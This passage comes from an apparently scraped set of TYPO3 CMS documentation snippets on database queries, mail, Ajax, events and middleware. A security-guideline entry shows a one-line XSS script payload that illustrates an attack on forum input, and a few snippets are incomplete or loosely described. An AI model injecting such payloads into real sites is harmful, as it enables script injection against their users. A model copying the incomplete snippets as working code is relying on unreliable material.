using dependency injection in a repository class. This is the recommended approach to get a Query Builder instance for a specific table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nnamespace MyVendor\\MyExtension\\Domain\\Repository;\n\nuse TYPO3\\CMS\\Core\\Database\\ConnectionPool;\n\nclass MyRepository\n{\n    protected ConnectionPool $connectionPool;\n\n    public function __construct(ConnectionPool $connectionPool)\n    {\n        $this->connectionPool = $connectionPool;\n    }\n\n    public function findSomething(): array\n    {\n        $queryBuilder = $this->connectionPool->getQueryBuilderForTable('tablename');\n        // Use query builder to create and execute a query\n        // ...\n        return [];\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Mail Transport in TYPO3\nDESCRIPTION: Configuration for sending emails via SMTP in TYPO3, including server settings, encryption, authentication credentials, and setting a default sender address for bounces.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport'] = 'smtp';\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_server'] = 'localhost';\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_encrypt'] = true;\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_username'] = 'johndoe';\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_password'] = 'cooLSecret';\n// Fetches all 'returning' emails:\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['defaultMailFromAddress'] = 'bounces@example.org';\n```\n\n----------------------------------------\n\nTITLE: Initializing AjaxRequest in TYPO3 (JavaScript)\nDESCRIPTION: Creates a new instance of AjaxRequest with a specified URL. This is the first step in preparing an Ajax request in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/AjaxRequest/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport AjaxRequest from '@typo3/core/ajax/ajax-request.js';\n\nconst request = new AjaxRequest('https://example.org/api/endpoint');\n```\n\n----------------------------------------\n\nTITLE: Sending Email with MailMessage in PHP\nDESCRIPTION: Shows how to create and send an email using the MailMessage class, including setting recipients, subject, and both text and HTML content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_13\n\nLANGUAGE: php\nCODE:\n```\nuse Symfony\\Component\\Mime\\Address;\nuse TYPO3\\CMS\\Core\\Mail\\MailMessage;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n// Create the message\n$mail = GeneralUtility::makeInstance(MailMessage::class);\n\n// Prepare and send the message\n$mail\n    // Defining the \"From\" email address and name as an object\n    // (email clients will display the name)\n    ->from(new Address('john.doe@example.org', 'John Doe'))\n\n    // Set the \"To\" addresses\n    ->to(\n        new Address('receiver@example.org', 'Max Mustermann'),\n        new Address('other@example.org')\n    )\n\n    // Give the message a subject\n    ->subject('Your subject')\n\n    // Give it the text message\n    ->text('Here is the message itself')\n\n    // And optionally an HTML message\n    ->html('<p>Here is the message itself</p>')\n\n    // Optionally add any attachments\n    ->attachFromPath('/path/to/my-document.pdf')\n\n    // And finally send it\n    ->send()\n;\n```\n\n----------------------------------------\n\nTITLE: Initializing DataHandler in TYPO3 PHP\nDESCRIPTION: This snippet demonstrates the basic setup for using the DataHandler class in TYPO3. It includes creating data and command arrays, instantiating the DataHandler, and setting up the admin panel if needed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\DataHandler;\n\n// Initializing:\n$data = [];\n$cmd = [];\n\n// Creating a DataHandler instance:\n$this->dataHandler = GeneralUtility::makeInstance(DataHandler::class);\n\n// Admin rights are required to execute DataHandler operations\n// This is achieved by setting the global $BE_USER->user['admin'] to 1\n// Setting admin rights temporarily (based on user permissions, this may be done in an appropriate method/place):\n$this->dataHandler->admin = true;\n\n// If you need a reference to the BE_USER object, usually after calling DataHandler operations:\n$adminPanel = $this->dataHandler->BE_USER;\n```\n\n----------------------------------------\n\nTITLE: Basic Form Protection Implementation in TYPO3\nDESCRIPTION: Shows how to implement CSRF protection in a TYPO3 extension by obtaining a form protection instance and generating a token for a form.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormProtection/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// EXT:my_extension/Classes/Controller/FormProtectionExample.php\n```\n\n----------------------------------------\n\nTITLE: Preventing Cross-Site Scripting in TYPO3 Fluid\nDESCRIPTION: An example demonstrating a typical XSS attack via JavaScript in a forum post, emphasizing the need for using htmlspecialchars() to encode special characters and prevent script execution.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesExtensionDevelopment/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"text/javascript\">alert(\"XSS\");</script>\n```\n\n----------------------------------------\n\nTITLE: Complex Multi-Join Query in TYPO3 Query Builder\nDESCRIPTION: Advanced example showing multiple JOIN operations with table aliasing to handle language overlay scenarios. The query joins tt_content with itself and sys_language table with specific constraints and grouping.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_19\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// SELECT `tt_content_orig`.`sys_language_uid`\n// FROM `tt_content`\n// INNER JOIN `tt_content` `tt_content_orig` ON `tt_content`.`t3_origuid` = `tt_content_orig`.`uid`\n// INNER JOIN `sys_language` `sys_language` ON `tt_content_orig`.`sys_language_uid` = `sys_language`.`uid`\n// WHERE\n//     (`tt_content`.`colPos` = 1)\n//     AND (`tt_content`.`pid` = 42)\n//     AND (`tt_content`.`sys_language_uid` = 2)\n//     AND ... RestrictionBuilder TCA restrictions for tables tt_content and sys_language ...\n// GROUP BY `tt_content_orig`.`sys_language_uid`\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('sys_language')\n$constraints = [\n    $queryBuilder->expr()->eq('tt_content.colPos', $queryBuilder->createNamedParameter(1, Connection::PARAM_INT)),\n    $queryBuilder->expr()->eq('tt_content.pid', $queryBuilder->createNamedParameter(42, Connection::PARAM_INT)),\n    $queryBuilder->expr()->eq('tt_content.sys_language_uid', $queryBuilder->createNamedParameter(2, Connection::PARAM_INT)),\n];\n$queryBuilder\n    ->select('tt_content_orig.sys_language_uid')\n    ->from('tt_content')\n    ->join(\n        'tt_content',\n        'tt_content',\n        'tt_content_orig',\n        $queryBuilder->expr()->eq(\n            'tt_content.t3_origuid',\n            $queryBuilder->quoteIdentifier('tt_content_orig.uid')\n        )\n    )\n    ->join(\n        'tt_content_orig',\n        'sys_language',\n        'sys_language',\n        $queryBuilder->expr()->eq(\n            'tt_content_orig.sys_language_uid',\n            $queryBuilder->quoteIdentifier('sys_language.uid')\n        )\n    )\n    ->where(...$constraints)\n    ->groupBy('tt_content_orig.sys_language_uid')\n    ->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Instantiating Doctrine Service from Container in PHP\nDESCRIPTION: A PHP code snippet showing how to access a public service (Doctrine) directly from the container at runtime, demonstrating when services need to be marked as public.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_16\n\nLANGUAGE: php\nCODE:\n```\n// only public services can be accessed in this way\n$doctrine = $container->get('doctrine');\n```\n\n----------------------------------------\n\nTITLE: Adding Custom RenderType in FormEngine for TYPO3 CMS in PHP\nDESCRIPTION: Example of adding a new renderType to TYPO3's FormEngine. This code registers a custom element implementation through the NodeFactory registry, making it available for use in TCA field definitions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\n// Add a new renderType by registering it in the NodeFactory via ext_localconf.php. The\n// priority number is used for overriding existing renderTypes. 30-39 is reserved\n// for extensions, numbers >= 40 are reserved for the core.\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['formEngine']['nodeRegistry'][1433196792] = [\n    'nodeName' => 'coolTagCloud',\n    'priority' => 30,\n    'class' => \\MyVendor\\CoolTagCloud\\Form\\Element\\CoolTagCloudElement::class\n];\n```\n\n----------------------------------------\n\nTITLE: Creating a Generic Button in TYPO3 Backend Module\nDESCRIPTION: This example demonstrates how to create and configure a generic button in a TYPO3 backend module using the GenericButton class. The button is customized with attributes including tag type, href, label, title, icon, and additional data attributes before being added to the button bar.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ButtonComponents.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$buttonBar = $this->moduleTemplate->getDocHeaderComponent()->getButtonBar();\n$genericButton = GeneralUtility::makeInstance(GenericButton::class)\n    ->setTag('a')\n    ->setHref('#')\n    ->setLabel('My label')\n    ->setTitle('My title')\n    ->setIcon($this->iconFactory->getIcon('actions-heart'))\n    ->setAttributes(['data-value' => '123']);\n$buttonBar->addButton($genericButton, ButtonBar::BUTTON_POSITION_RIGHT, 2);\n```\n\n----------------------------------------\n\nTITLE: Using Argument Unpacking with WHERE Expressions in TYPO3 Query Builder\nDESCRIPTION: Demonstrates how to use argument unpacking with QueryBuilder's where() method to create flexible WHERE expressions. The example shows how to conditionally add expressions to a query based on runtime conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_17\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n$whereExpressions = [\n    $queryBuilder->expr()->eq('bodytext', $queryBuilder->createNamedParameter('lorem', Connection::PARAM_STR)),\n    $queryBuilder->expr()->eq('header', $queryBuilder->createNamedParameter('a name', Connection::PARAM_STR))\n];\nif ($needsAdditionalExpression) {\n    $whereExpressions[] = $someAdditionalExpression;\n}\n$queryBuilder->where(...$whereExpressions);\n```\n\n----------------------------------------\n\nTITLE: Extbase BlogController New Action\nDESCRIPTION: This code snippet demonstrates a new action in an Extbase BlogController. It shows how to define action parameters with strong types for validation and how to use the `@TYPO3\\CMS\\Extbase\\Annotation\\IgnoreValidation` annotation to disable validation for specific domain objects. The action renders a view by returning `$this->htmlResponse()`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/ActionController.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nnamespace Vendor\\Extension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass BlogController extends ActionController\n{\n    /**\n     * action new\n     *\n     * @param Vendor\\Extension\\Domain\\Model\\Blog $newBlog\n     * @return ResponseInterface\n     */\n    public function newAction(Vendor\\Extension\\Domain\\Model\\Blog $newBlog = NULL): ResponseInterface\n    {\n        $this->view->assign('newBlog', $newBlog);\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching Files in TYPO3 Storage using FAL - PHP\nDESCRIPTION: Demonstrates how to search for files across an entire storage in TYPO3 using FileSearchDemand. Shows the implementation of storage-wide file search functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileSearch.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n_ExamplesFileSearch/_SearchInStorage.php\n```\n\n----------------------------------------\n\nTITLE: Implementing Event Listener in PHP for TYPO3 Extension\nDESCRIPTION: This code snippet demonstrates how to create an event listener class in PHP for a TYPO3 extension. It listens to a PasswordChangeEvent and sets the password as invalid under certain conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Events/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\nnamespace MyVendor\\MyExtension\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Authentication\\Event\\PasswordChangeEvent;\n\nclass Joh316PasswordInvalidator\n{\n    public function __invoke(PasswordChangeEvent $event): void\n    {\n        if (mb_strtolower($event->getPassword()) === 'joh316') {\n            $event->setAsInvalid();\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Context Menu Trigger in HTML\nDESCRIPTION: Example of HTML markup required to activate a context menu on an icon in a TYPO3 backend module. The data attributes specify the table, uid, and trigger event for the context menu.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ContextualMenu.rst#2025-04-16_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<td>\n    <a href=\"#\"\n        data-contextmenu-trigger=\"click\"\n        data-contextmenu-table=\"be_users\"\n        data-contextmenu-uid=\"{compareUser.uid}\"\n        title=\"id={compareUser.uid}\"\n    >\n        <be:avatar backendUser=\"{compareUser.uid}\" showIcon=\"TRUE\" />\n    </a>\n</td>\n```\n\n----------------------------------------\n\nTITLE: Using Event Delegation for Multiple Elements in TYPO3 JavaScript\nDESCRIPTION: Shows how to use event delegation to bind an event listener to multiple elements matching a selector within a parent element. This reduces browser overhead by installing a single listener on the parent that reacts to events from matching children.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/JavaScript/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n// AnyEventStrategy is a placeholder, concrete implementations are handled in the following chapters\nnew AnyEventStrategy('click', callbackFn).delegateTo(document.getElementById('foobar'), '.any-class');\n```\n\n----------------------------------------\n\nTITLE: Creating Secure User Forms in TYPO3 Extbase\nDESCRIPTION: A typical form structure in TYPO3 Extbase that ensures properties such as email, password, and description can be edited. It demonstrates how transparent argument mapping is applied, crucial for maintaining security by preventing unwanted user manipulations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesExtensionDevelopment/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<f:form name=\"user\" object=\"{user}\" action=\"update\">\n   <f:form.textbox property=\"email\" />\n   <f:form.textbox property=\"password\" />\n   <f:form.textbox property=\"description\" />\n</f:form>\n```\n\n----------------------------------------\n\nTITLE: Dispatching a Custom Event in TYPO3 PHP\nDESCRIPTION: Shows how to create an event object and dispatch it using the EventDispatcher in a TYPO3 class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension;\n\nuse MyVendor\\MyExtension\\Event\\DoingThisAndThatEvent;\nuse Psr\\EventDispatcher\\EventDispatcherInterface;\n\nclass SomeClass\n{\n    public function __construct(\n        private readonly EventDispatcherInterface $eventDispatcher\n    ) {\n    }\n\n    public function doSomething(): void\n    {\n        $event = new DoingThisAndThatEvent('foo', 'bar');\n        $event = $this->eventDispatcher->dispatch($event);\n        $modifiedValue = $event->getMutableProperty();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Including JavaScript Modules in TYPO3 Backend Fluid Template\nDESCRIPTION: Using the includeJavaScriptModules property of the f:be.pageRenderer ViewHelper to include JavaScript modules in a TYPO3 backend Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/ES6/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<f:be.pageRenderer\n    includeJavaScriptModules=\"{0: '@vendor/my-extension/my-module.js'}\"\n/>\n\n```\n\n----------------------------------------\n\nTITLE: Registering Console Commands in Services.yaml\nDESCRIPTION: Configuration for registering console commands in the Services.yaml file, specifying command name, description, and options like schedulable, hidden, and alias.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  _defaults:\n    autowire: true\n    autoconfigure: true\n    public: false\n\n  T3docs\\Examples\\:\n    resource: '../Classes/*'\n    exclude: '../Classes/Domain/Model/*'\n\n  T3docs\\Examples\\Command\\DoSomethingCommand:\n    tags:\n      - name: console.command\n        command: 'examples:dosomething'\n        description: 'A command that does nothing and always succeeds.'\n      # Also an alias for the command can be configured\n      - name: console.command\n        command: 'examples:dosomethingalias'\n        alias: true\n```\n\n----------------------------------------\n\nTITLE: Preventing SQL Injection in TypoScript CONTENT Object\nDESCRIPTION: This snippet demonstrates how to safely use markers in a TypoScript CONTENT object to prevent SQL injection. It uses the GP:fooid data source, which is properly escaped and quoted.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/Typoscript.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\npage = PAGE\npage.10 = CONTENT\npage.10 {\n  table = tt_content\n  select {\n    pidInList = 123\n    where = deleted=0 AND uid=###CONTENTID###\n    markers {\n        CONTENTID.data = GP:fooid\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Alias for Custom Data Processor in TYPO3\nDESCRIPTION: This YAML configuration registers an alias for the custom data processor in TYPO3's dependency injection container. It allows using a short identifier instead of the fully-qualified class name.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/CustomDataProcessing.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nT3docs\\Examples\\DataProcessing\\CustomCategoryProcessor:\n    tags:\n        - name: 'data.processor'\n          identifier: 'custom-category'\n```\n\n----------------------------------------\n\nTITLE: Query Example with Integer and Array Parameters in TYPO3\nDESCRIPTION: Demonstrates using QueryBuilder with integer and array parameters, showing proper parameter typing and restriction handling for a tt_content query.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_29\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n// SELECT * FROM `tt_content`\n//     WHERE `bodytext` = 'kl\\'aus'\n//     AND   sys_language_uid = 0\n//     AND   pid in (2, 42,13333)\n$searchWord = \"kl'aus\"; // $searchWord retrieved from the PSR-7 request\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder->getRestrictions()->removeAll();\n$queryBuilder\n    ->select('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'bodytext',\n            $queryBuilder->createNamedParameter($searchWord)\n        ),\n        $queryBuilder->expr()->eq(\n            'sys_language_uid',\n            $queryBuilder->createNamedParameter($language, Connection::PARAM_INT)\n        ),\n        $queryBuilder->expr()->in(\n            'pid',\n            $queryBuilder->createNamedParameter($pageIds, Connection::PARAM_INT_ARRAY)\n        )\n    )\n    ->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Using Method-Level PHP Attributes for TYPO3 Event Listeners\nDESCRIPTION: Shows how to use PHP attributes at the method level to define multiple event listeners within a single class in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Core\\Mail\\Event\\BeforeMailerSentMessageEvent;\nuse TYPO3\\CMS\\Core\\Mail\\Event\\AfterMailerSentMessageEvent;\n\nfinal class MailerEventListener\n{\n    #[AsEventListener(\n        identifier: 'my-extension/before-mailer-sent'\n    )]\n    public function beforeMailerSent(BeforeMailerSentMessageEvent $event): void\n    {\n        // Before mailer sent logic\n    }\n\n    #[AsEventListener(\n        identifier: 'my-extension/after-mailer-sent'\n    )]\n    public function afterMailerSent(AfterMailerSentMessageEvent $event): void\n    {\n        // After mailer sent logic\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using JOIN Operations with TYPO3 Query Builder\nDESCRIPTION: Example of using join() method to perform an INNER JOIN between the sys_language and pages tables. The query selects language data based on page relationship with proper parameter handling and expression building.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_18\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// SELECT `sys_language`.`uid`, `sys_language`.`title`\n// FROM `sys_language`\n// INNER JOIN `pages` `p`\n//     ON `p`.`sys_language_uid` = `sys_language`.`uid`\n// WHERE\n//     (`p`.`uid` = 42)\n//     AND (\n//          (`p`.`deleted` = 0)\n//          AND (\n//              (`sys_language`.`hidden` = 0) AND (`overlay`.`hidden` = 0)\n//          )\n//          AND (`p`.`starttime` <= 1475591280)\n//          AND ((`p`.`endtime` = 0) OR (`overlay`.`endtime` > 1475591280))\n//     )\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('sys_language')\n$result = $queryBuilder\n   ->select('sys_language.uid', 'sys_language.title')\n   ->from('sys_language')\n   ->join(\n       'sys_language',\n       'pages',\n       'p',\n       $queryBuilder->expr()->eq('p.sys_language_uid', $queryBuilder->quoteIdentifier('sys_language.uid'))\n   )\n   ->where(\n       $queryBuilder->expr()->eq('p.uid', $queryBuilder->createNamedParameter(42, Connection::PARAM_INT))\n   )\n   ->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Updating Multiple Rows in TYPO3 Database\nDESCRIPTION: Example of updating multiple records in the tt_content table based on a WHERE condition. Shows basic UPDATE query construction using the Connection API.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/BasicCrud/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nUPDATE `tt_content` SET `bodytext` = 'ipsum' WHERE `bodytext` = 'lorem'\n```\n\n----------------------------------------\n\nTITLE: Configuring Install Tool Password in TYPO3 Settings\nDESCRIPTION: Demonstrates the configuration of the Install Tool password in the system settings file. The password is stored using a hashed mechanism and is independent of backend user passwords.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/InstallTool.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nreturn [\n    'BE' => [\n        'installToolPassword' => '$P$CnawBtpk.D22VwoB2RsN0jCocLuQFp.',\n        // ...\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Connection Class in PHP\nDESCRIPTION: The fully qualified class name for the TYPO3 Connection class that represents a specific connection to a database. It provides methods for simple standard queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ClassOverview/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nTYPO3\\CMS\\Core\\Database\\Connection\n```\n\n----------------------------------------\n\nTITLE: Implementing an Action with ModuleTemplate in TYPO3 Backend Controller\nDESCRIPTION: This code demonstrates a controller action that uses ModuleTemplate to render a response with assigned variables and adds a shortcut button to the module's button bar.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModuleWithExtbase.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// use Psr\\Http\\Message\\ResponseInterface\npublic function myAction(): ResponseInterface\n{\n    $moduleTemplate = $this->moduleTemplateFactory->create($this->request);\n\n    // Example of assignung variables to the view\n    $moduleTemplate->assign('someVar', 'someContent');\n\n    // Example of adding a page-shortcut button\n    $routeIdentifier = 'web_examples'; // array-key of the module-configuration\n    $buttonBar = $moduleTemplate->getDocHeaderComponent()->getButtonBar();\n    $shortcutButton = $buttonBar->makeShortcutButton()->setDisplayName('Shortcut to my action')->setRouteIdentifier($routeIdentifier);\n    $shortcutButton->setArguments(['controller' => 'MyController', 'action' => 'my']);\n    $buttonBar->addButton($shortcutButton, ButtonBar::BUTTON_POSITION_RIGHT);\n    // Adding title, menus and more buttons using $moduleTemplate ...\n\n    return $moduleTemplate->renderResponse('MyController/MyAction');\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Ajax Controller Logic in PHP\nDESCRIPTION: Adds business logic to the Ajax controller to handle number exponentiation. The controller accepts an input parameter and calculates its square.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/Ajax.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\n\nclass ExampleController\n{\n    public function doSomethingAction(ServerRequestInterface $request): ResponseInterface\n    {\n        $queryParams = $request->getQueryParams();\n        $input = (int)($queryParams['input'] ?? 0);\n        $result = $input ** 2;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling TYPO3 Ajax Response (JavaScript)\nDESCRIPTION: Demonstrates how to handle the response from a TYPO3 Ajax request. It uses the then() method to process the response and logs the result.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/AjaxRequest/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\npromise.then(\n  async (response) => {\n    const result = await response.resolve();\n    console.log(result);\n  }\n);\n```\n\n----------------------------------------\n\nTITLE: Implementing a Request Enriching Middleware in TYPO3\nDESCRIPTION: This middleware demonstrates how to extend the current request with additional information by building a new request with attributes before passing it to the next handler in the middleware chain.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Middlewares.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types = 1);\nnamespace MyVendor\\MyExtension\\Middleware;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Psr\\Http\\Server\\MiddlewareInterface;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\n\nclass RequestEnrichingMiddleware implements MiddlewareInterface\n{\n    public function process(\n        ServerRequestInterface $request,\n        RequestHandlerInterface $handler\n    ): ResponseInterface {\n        // Do your magic here, e.g. extract data from request\n        $foo = $this->calculateSomeValueFromRequest($request);\n\n        // Prepare enriched request\n        $enhancedRequest = $request->withAttribute('myExtension', [\n            'foo' => $foo,\n        ]);\n\n        return $handler->handle($enhancedRequest);\n    }\n\n    protected function calculateSomeValueFromRequest(ServerRequestInterface $request): string\n    {\n        // Do even more magic\n        return 'bar';\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Tagging JavaScript Modules for Backend Form Usage in TYPO3\nDESCRIPTION: Configuration example for tagging JavaScript modules to be used in backend forms, ensuring they are available even when loaded dynamically via Ajax.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/ES6/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nreturn [\n    'dependencies' => ['core'],\n    'imports' => [\n        '@vendor/my-extension/' => 'EXT:my_extension/Resources/Public/JavaScript/',\n    ],\n    'tags' => [\n        'backend.form' => [\n            '@vendor/my-extension/form-element.js',\n        ],\n    ],\n];\n\n```\n\n----------------------------------------\n\nTITLE: Accessing File References in Extbase Domain Model with PHP\nDESCRIPTION: This snippet shows the structure necessary for accessing file references within an Extbase domain model. It requires setting up the domain model and a corresponding TCA entry to allow file attachments via the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n// EXT:my_extension/Classes/Domain/Model/Blog.php\ndeclare(strict_types=1);\nnamespace 